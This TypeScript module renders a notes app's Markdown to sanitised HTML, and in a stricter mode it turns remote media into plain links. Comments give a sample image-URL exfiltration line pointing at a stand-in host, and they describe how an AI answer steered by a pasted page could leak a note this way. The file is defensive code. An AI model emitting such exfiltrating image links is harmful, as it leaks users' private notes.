import DOMPurify from "dompurify";
import { marked } from "marked";

const VIDEO = /\.(mp4|webm|mov)$/i;
const AUDIO = /\.(mp3|m4a|ogg|wav)$/i;

// ![titre](fichier.mp4) plays as a video, the same way an image shows as an image.
marked.use({
  gfm: true,
  breaks: true,
  renderer: {
    image({ href, title, text }) {
      const name = title || text || "";
      const esc = (s: string) => s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
      if (VIDEO.test(name) || VIDEO.test(href)) return `<video src="${esc(href)}" controls preload="metadata" playsinline></video>`;
      if (AUDIO.test(name) || AUDIO.test(href)) return `<audio src="${esc(href)}" controls preload="metadata"></audio>`;
      return `<img src="${esc(href)}" alt="${esc(text)}" loading="lazy">`;
    },
  },
});

/**
 * True when `src` is one of the note's own attachments, served by this app. The address is resolved
 * first: "//evil.example/x" and "/\\evil.example/x" start with a slash and still leave the origin.
 */
export function isOwnFile(src: string, origin: string) {
  try {
    const url = new URL(src, origin);
    return url.origin === origin && url.pathname.startsWith("/api/files/");
  } catch {
    return false;
  }
}

// What Markdown itself produces, and no more. An allow-list, because every tag or attribute that
// makes the browser fetch something (style, srcset, poster, <source>, SVG <image>, <input type=image>…)
// is a way out for the text, and a deny-list always misses one.
const QUOTED = {
  ALLOWED_TAGS: ["a", "audio", "b", "blockquote", "br", "code", "del", "details", "div", "em", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "img", "input", "kbd", "li", "mark", "ol", "p", "pre", "s", "span", "strong", "sub", "summary", "sup", "table", "tbody", "td", "th", "thead", "tr", "ul", "video"],
  ALLOWED_ATTR: ["align", "alt", "checked", "class", "colspan", "controls", "disabled", "href", "loading", "playsinline", "preload", "rowspan", "src", "start", "title", "type"],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
  RETURN_DOM_FRAGMENT: true as const,
};

/**
 * Markdown to safe HTML. Notes can hold pasted content: nothing in them may run script.
 *
 * `remoteMedia: false` is for text the user did not write (an AI answer, which a pasted page may
 * have steered): nothing in the result loads from another site by itself. An image address can carry
 * the note away ("![](https://evil.example/?d=…)") before any button is pressed, so remote media
 * become plain links, which need a click.
 */
export function renderMarkdown(source: string, { remoteMedia = true }: { remoteMedia?: boolean } = {}) {
  const html = marked.parse(source, { async: false });
  if (remoteMedia) return DOMPurify.sanitize(html, { ADD_TAGS: ["video", "audio"], ADD_ATTR: ["controls", "playsinline", "preload", "target"], FORBID_TAGS: ["style", "form"] });

  // The fragment belongs to the inert document DOMPurify parsed into: nothing loads while it is
  // rewritten here, and it must stay there until the remote addresses are gone.
  const fragment = DOMPurify.sanitize(html, QUOTED);
  const doc = fragment.ownerDocument;
  for (const el of fragment.querySelectorAll("[src]")) {
    const src = el.getAttribute("src") ?? "";
    if (!/^(img|video|audio)$/i.test(el.tagName)) el.removeAttribute("src");
    else if (!isOwnFile(src, location.origin)) {
      const label = el.getAttribute("alt") || src;
      if (!/^https?:\/\//i.test(src)) el.replaceWith(doc.createTextNode(label));
      else {
        const link = doc.createElement("a");
        link.href = src;
        link.textContent = label;
        el.replaceWith(link);
      }
    }
  }
  for (const el of fragment.querySelectorAll("input")) {
    // Task lists are the only inputs Markdown makes.
    if (el.getAttribute("type") !== "checkbox") el.remove();
    else el.setAttribute("disabled", "");
  }
  for (const el of fragment.querySelectorAll("a")) {
    el.setAttribute("rel", "noreferrer noopener");
    el.setAttribute("target", "_blank");
  }
  const box = doc.createElement("div");
  box.append(fragment);
  return box.innerHTML;
}

/** The Markdown to insert for an uploaded file. */
export function markdownForFile(name: string, mime: string, url: string) {
  const label = name.replace(/[\[\]]/g, "");
  return /^(image|video|audio)\//.test(mime) ? `![${label}](${url})` : `[${label}](${url})`;
}

const TERMINAL = /^(bash|sh|shell|zsh|console|terminal)$/i;

/** The name shown on a code block: "Terminal" for shell code, else the language Markdown gave it. */
export function codeLabel(className: string) {
  const lang = className.match(/language-([\w+#-]+)/)?.[1] ?? "";
  if (!lang) return "Code";
  return TERMINAL.test(lang) ? "Terminal" : lang;
}
